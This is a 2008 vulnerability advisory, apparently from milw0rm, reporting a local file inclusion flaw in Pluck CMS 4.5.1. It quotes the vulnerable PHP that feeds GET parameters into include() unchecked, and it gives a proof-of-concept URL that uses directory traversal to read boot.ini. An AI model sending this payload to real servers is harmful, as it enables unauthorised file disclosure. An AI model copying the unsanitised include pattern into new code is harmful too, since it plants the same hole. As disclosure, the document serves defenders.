@@ -1,0 +1,70 @@
+########################## www.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: Pluck Local File inclusion
+# Vendor: http://www.pluck-cms.org
+# Bug: Local File Inclusion
+# Vulnerable Version: 4.5.1 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix: N/A
+###################################################################
+
+
+####################
+- Description:
+####################
+
+Pluck is a content management system, written in php.
+
+
+####################
+- Vulnerability:
+####################
+
++--> Local File Inclusion
+
+Input passed to multiple parameters in "predefined_variables.php" are not properly verified 
+before being used to include files.
+This can be exploited to include arbitrary files from local resources.
+
+Code Snippet:
+/data/inc/themes/predefined_variables.php #line:15-38
+
+//Include Translation data
+include ("data/settings/langpref.php");
+include ("data/inc/lang/$langpref");
+//Get Site-title
+$sitetitle = file_get_contents("data/settings/title.dat");
+
+//Get the page-data
+$filetoread = $_GET['file'];
+$album = $_GET['album'];
+$blogpost = $_GET['blogpost'];
+$cat = $_GET['cat'];
+
+if (($filetoread) && (file_exists("data/content/$filetoread"))) {
+include "data/content/$filetoread"; }
+
+elseif ($album) {
+$title = $album; }
+
+elseif ($blogpost) {
+include("data/blog/$cat/posts/$blogpost"); }
+
+elseif ((!file_exists("data/content/$filetoread")) && (!$album) && (!$blogpost)) {
+$title = $lang_front1;
+$content = $lang_front2; }
+
+
+POC: http://localhost/pluck-4_5_1/data/inc/themes/predefined_variables.php?blogpost=../../../../../../../../boot.ini
+
+####################
+- Credit :
+####################
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.comz
+
+# milw0rm.com [2008-07-14]
